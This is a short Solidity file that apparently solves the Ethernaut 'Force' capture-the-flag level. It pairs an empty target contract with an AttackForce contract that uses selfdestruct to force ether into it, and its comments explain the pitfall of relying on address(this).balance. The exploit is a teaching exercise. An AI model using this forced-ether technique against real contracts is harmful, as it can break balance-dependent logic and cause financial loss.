// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title Force
/// @author openZeppelin
/// @notice Some contracts will not take your money
///         For a contract to be able to receive ether, the fallback function must be marked payable, or receive
///         But, there is no way to stop an attacker from sending ether by self destroying a contract
///         Best not to use address(this).balance

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract AttackForce {
  Force public force;

  constructor(address _force){
    force = Force(_force);
  }

  function attack() public payable {
    address payable addr = payable(address(force));
    selfdestruct(addr);
  }

  // receive() external payable {}
}